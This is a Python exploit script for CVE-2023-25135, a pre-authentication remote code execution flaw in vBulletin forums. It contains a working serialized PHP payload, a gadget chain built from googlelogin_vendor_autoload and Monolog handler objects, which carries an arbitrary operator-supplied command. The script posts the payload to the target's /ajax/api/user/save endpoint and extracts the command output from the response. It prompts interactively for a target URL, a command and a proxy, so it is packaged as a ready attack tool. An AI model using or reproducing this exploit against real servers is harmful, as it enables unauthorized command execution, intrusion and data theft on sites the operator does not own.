#!/usr/bin/env python3
# Exploit for CVE-2023-25135: vBulletin pre-authentication RCE
# Modified by: TAWKHID NATAEV

import requests
import time

def print_banner():
    banner = r"""
__/\\\\\_____/\\\_        _____/\\\\\\\\\____        __/\\\\\\\\\\\\\\\_        _____/\\\\\\\\\____        __/\\\\\\\\\\\\\\\_        __/\\\________/\\\_        
 _\/\\\\\\___\/\\\_        ___/\\\\\\\\\\\\\__        _\///////\\\/////__        ___/\\\\\\\\\\\\\__        _\/\\\///////////__        _\/\\\_______\/\\\_       
  _\/\\\/\\\__\/\\\_        __/\\\/////////\\\_        _______\/\\\_______        __/\\\/////////\\\_        _\/\\\_____________        _\//\\\______/\\\__      
   _\/\\\//\\\_\/\\\_        _\/\\\_______\/\\\_        _______\/\\\_______        _\/\\\_______\/\\\_        _\/\\\\\\\\\\\_____        __\//\\\____/\\\___     
    _\/\\\\//\\\\/\\\_        _\/\\\\\\\\\\\\\\\_        _______\/\\\_______        _\/\\\\\\\\\\\\\\\_        _\/\\\///////______        ___\//\\\__/\\\____    
     _\/\\\_\//\\\/\\\_        _\/\\\/////////\\\_        _______\/\\\_______        _\/\\\/////////\\\_        _\/\\\_____________        ____\//\\\/\\\_____   
      _\/\\\__\//\\\\\\_        _\/\\\_______\/\\\_        _______\/\\\_______        _\/\\\_______\/\\\_        _\/\\\_____________        _____\//\\\\\______  
       _\/\\\___\//\\\\\_        _\/\\\_______\/\\\_        _______\/\\\_______        _\/\\\_______\/\\\_        _\/\\\\\\\\\\\\\\\_        ______\//\\\_______ 
        _\///_____\/////__        _\///________\///__        _______\///________        _\///________\///__        _\///////////////__        _______\///________ 
Modified by: TAWKHID NATAEV
"""

    for char in banner:
        print(char, end='', flush=True)
        time.sleep(0.01)

    print("\n")

def exploit_vbulletin(url, command, proxy=None):
    print_banner()

    proxies = {"http": proxy, "https": proxy} if proxy else None

    marker = "ExploitMarker"  # You can choose any unique marker
    command = f"echo {marker}::; {command}; echo ::{marker}"
    
    payload = (
        b'a:2:{i:0;O:27:"googlelogin_vendor_autoload":0:{}i:1;O:32:"Monolog\\Handle'
        b'r\\SyslogUdpHandler":1:{s:9:"\x00*\x00socket";O:29:"Monolog\\Handler\\Buf'
        b'ferHandler":7:{s:10:"\x00*\x00handler";r:4;s:13:"\x00*\x00bufferSize";i:-1;s'
        b':9:"\x00*\x00buffer";a:1:{i:0;a:2:{i:0;s:[LEN]:"[COMMAND]";s:5:"level";N;}}s:8:"\x00'
        b'*\x00level";N;s:14:"\x00*\x00initialized";b:1;s:14:"\x00*\x00bufferLimit";i'
        b':-1;s:13:"\x00*\x00processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}}}'
    )
    
    payload = payload.replace(b"[LEN]", str(len(command)).encode())
    payload = payload.replace(b"[COMMAND]", command.encode())
    
    data = {
        "adminoptions": "",
        "options": "",
        "password": "password",
        "securitytoken": "guest",
        "user[email]": "pown@pown.net",
        "user[password]": "password",
        "user[searchprefs]": payload,
        "user[username]": "toto",
        "userfield": "",
        "userid": "0",
    }

    try:
        response = requests.post(url + "/ajax/api/user/save", data=data, proxies=proxies)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"Exploit failed: {str(e)}")
        return

    result = response.text.split(f"{marker}::")
    if len(result) != 3:
        print("Exploit potentially failed: command output not found")
        return

    print("Exploit succeeded!")
    print("-" * 80)
    print(result[1])
    print("-" * 80)

if __name__ == "__main__":
    target_url = input("Enter the target vBulletin URL: ").strip()
    command_to_execute = input("Enter the command to execute: ").strip()
    proxy_to_use = input("Enter the proxy (optional, press Enter if none): ").strip()

    exploit_vbulletin(target_url, command_to_execute, proxy_to_use)

